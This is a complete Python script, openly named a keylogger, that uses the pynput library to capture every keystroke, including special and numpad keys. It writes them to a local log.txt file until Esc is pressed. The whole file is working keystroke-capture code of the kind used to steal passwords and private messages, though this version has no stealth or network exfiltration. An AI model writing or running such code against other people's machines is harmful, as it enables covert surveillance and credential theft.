# Required libraries
from pynput.keyboard import Key, Listener


class KeyLogger:
    """Log keyboard events and save them to a file."""

    def __init__(self):
        self.keys = []
        with Listener(
                on_press=self.on_press,
                on_release=self.on_release
        ) as listener:
            listener.join()

    def on_press(self, key):
        """Key when pressed."""
        # Bool | if 'key' has the attribute vk
        _HASATTR_VK = hasattr(key, "vk")

        # Special Keys
        if key == Key.enter:
            self.keys.append("[Enter]")
        elif key == Key.esc:
            self.keys.append("[Esc]")
        elif key == Key.space:
            self.keys.append(" ")
        elif key == Key.backspace:
            self.keys.append("[Backspace]")
        elif key == Key.tab:
            self.keys.append("[Tab]")
        elif key in (Key.shift, Key.shift_r):
            self.keys.append("[SHIFT]")
        elif key == Key.alt_l:
            self.keys.append("[Alt]")
        elif key == Key.alt_gr:
            self.keys.append("[Alt Gr]")
        elif key in (Key.ctrl_l, Key.ctrl_r):
            self.keys.append("[Ctrl]")
        elif key == Key.caps_lock:
            self.keys.append("[Caps Lock]")
        elif key in (Key.cmd, Key.cmd_r):
            self.keys.append("[Super]")
        elif key == Key.left:
            self.keys.append("[Left]")
        elif key == Key.right:
            self.keys.append("[Right]")
        elif key == Key.down:
            self.keys.append("[Down]")
        elif key == Key.up:
            self.keys.append("[Up]")

        # NUMPAD
        elif _HASATTR_VK and key.vk == 96:
            self.keys.append("0")
        elif _HASATTR_VK and key.vk == 97:
            self.keys.append("1")
        elif _HASATTR_VK and key.vk == 98:
            self.keys.append("2")
        elif _HASATTR_VK and key.vk == 99:
            self.keys.append("3")
        elif _HASATTR_VK and key.vk == 100:
            self.keys.append("4")
        elif _HASATTR_VK and key.vk == 101:
            self.keys.append("5")
        elif _HASATTR_VK and key.vk == 102:
            self.keys.append("6")
        elif _HASATTR_VK and key.vk == 103:
            self.keys.append("7")
        elif _HASATTR_VK and key.vk == 104:
            self.keys.append("8")
        elif _HASATTR_VK and key.vk == 105:
            self.keys.append("9")
        elif _HASATTR_VK and key.vk == 110:
            self.keys.append(",")
        elif _HASATTR_VK and key.vk == 111:
            self.keys.append("/")

        # Common keys [a, b, c, d, ...]
        else:
            self.keys.append(key)
        self.add_keys_to_log(self.keys)  # Feed the list of keys

    def add_keys_to_log(self, keys):
        """Writes events to file."""
        with open("log.txt", "w") as _LOG:  # Change directory as needed
            for key in self.keys:
                key = str(key).replace("'", "")
                _LOG.write(key)

    def on_release(self, key):
        """Release keys."""
        if key == Key.esc:  # Terminate the script
            return False


# Instantiation
K = KeyLogger()
